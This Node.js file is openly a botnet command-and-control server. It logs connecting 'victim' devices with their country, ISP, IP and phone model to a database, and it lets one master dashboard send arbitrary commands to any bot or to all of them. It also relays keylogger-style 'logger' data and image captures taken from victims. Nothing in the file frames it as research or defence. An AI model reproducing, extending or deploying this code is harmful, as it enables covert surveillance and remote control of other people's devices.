import express  from "express";
import path from 'path'
import { Server } from "socket.io";
import bodyParser from 'body-parser';
import cors from 'cors'
import sqlite3 from "sqlite3";
import chalk from "chalk";




// Variables
const portB = 4000
const portM = 4001
const ipB = "0.0.0.0"
const ipM = "127.0.0.1"
let adminSoc=null;
// Variables



// DATABASE
let db = new sqlite3.Database('./database/devicesDB', (err) => {
    if (err) {
      return console.error(err.message);
    }
    console.log(chalk.cyan('\nConnected to the in-memory SQlite database'));
    console.log(chalk.grey('=====================[logs]=====================\n'));
  });

// RESETING DB
db.get(`delete from victim`,[],(err)=>{
    if (err) {
        return console.error(err.message);
    }
})

  // close the database connection
//   db.close((err) => {
//     if (err) {
//       return console.error(err.message);
//     }
//     console.log('Close the database connection.');
//   });



// Express
const app = express()
app.use(bodyParser.urlencoded({ extended: false }))
app.use(express.static('static'))
app.use(cors())

app.get("/dashboard",(req,res)=>{
    res.sendFile(path.resolve("./static/html/index.html"))
})

app.post("/info",(req,res)=>{
    db.get(`select * from victim where id = ?`,[req.body.id],(err,row)=>{
        if (err) {
            return console.error(err.message);
        }
        // console.log("Deleted")
        res.json(row)
    })
})

app.post("/send",(req,res)=>{
    if(req.body.emit == "" || req.body.id == ""){
        res.status(400).send()
        return
    }

    if(req.body.emit == "ping"){
        ids.forEach(id=>{
            botIo.sockets.sockets.get(id).emit("ping",req.body.args)
        })
    }else{
        botIo.sockets.sockets.get(req.body.id).emit(req.body.emit,req.body.args)
        console.log(req.body.id,req.body.emit,req.body.args)
    }
    res.status(200).send("Good")
})



const botnet = express().listen(portB,ipB, () => {
    console.log(`Bot Network listening on http://${ipB}:${portB}/`)
})    

const masterServer = app.listen(portM,ipM, () => {
    console.log(`Master Network listening on http://${ipM}:${portM}/`)
}) 


// Socket io Connection for BOTS
const botIo = new Server(botnet);
botIo.on("connection",(socket)=>{
    var data = JSON.parse(socket.handshake.query.info)
    db.get(`insert into victim(ID,Country,ISP,IP,Brand,Model,Manufacture) values(?,?,?,?,?,?,?)`,[socket.id,data.Country,data.ISP,data.IP,data.Brand,data.Model,data.Manufacture],(err)=>{
        if (err) {
            return console.error(err.message);
        }
    })
    console.log(chalk.green(`[+] Bot Connected (${socket.id}) => ${socket.request.connection.remoteAddress}:${socket.request.connection.remotePort}`))
    getRemaining()


    socket.on("disconnect",()=>{
        db.get(`delete from victim where id = ?`,[socket.id],(err)=>{
            if (err) {
                return console.error(err.message);
            }
        })
        console.log(chalk.redBright(`[x] Bot Disconnected (${socket.id})`))
        getRemaining()
    })

    socket.on("logger",(data)=>{
        try {
            adminSoc.emit("logger",data)
        } catch (err) {
            console.error(err)
        }
    })

    socket.on("img",(data)=>{
        try {
            adminSoc.emit("img",data)
            // console.log(chalk.grey("data"))
        } catch (err) {
            console.error(err)
        }
    })
})


// Socket io Connection for Master
const masterIo = new Server(masterServer);
masterIo.on("connection",(socket)=>{
    if(adminSoc == null){
        console.log(chalk.greenBright(`[+] Master got Connected (${socket.id})`))
        adminSoc = socket
        getRemaining()
    
        socket.on("disconnect",()=>{
            console.log(chalk.red(`[x] Master got Disconnected (${socket.id})`))
            adminSoc = null
        })
    }else{
        socket.disconnect()
    }
})


function getRemaining() {
    var data = []
    db.each(`select ID,Brand,Model from victim limit 20`,[],(err,row)=>{
        if (err) {
            return console.error(err.message);
        }
        data.push([row.ID,row.Brand,row.Model])
    },()=>{
        if(adminSoc != null){
            adminSoc.emit("info",data);
        }
    })
}

